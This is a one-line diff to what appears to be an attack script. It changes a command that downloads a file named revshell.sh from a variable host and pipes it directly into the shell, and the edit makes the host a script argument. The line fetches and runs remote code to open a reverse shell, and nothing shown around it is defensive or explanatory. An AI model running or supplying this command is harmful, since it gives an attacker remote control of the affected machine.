@@ -1,1 +1,1 @@
-curl $IP/revshell.sh |sh
+curl $1/revshell.sh |sh
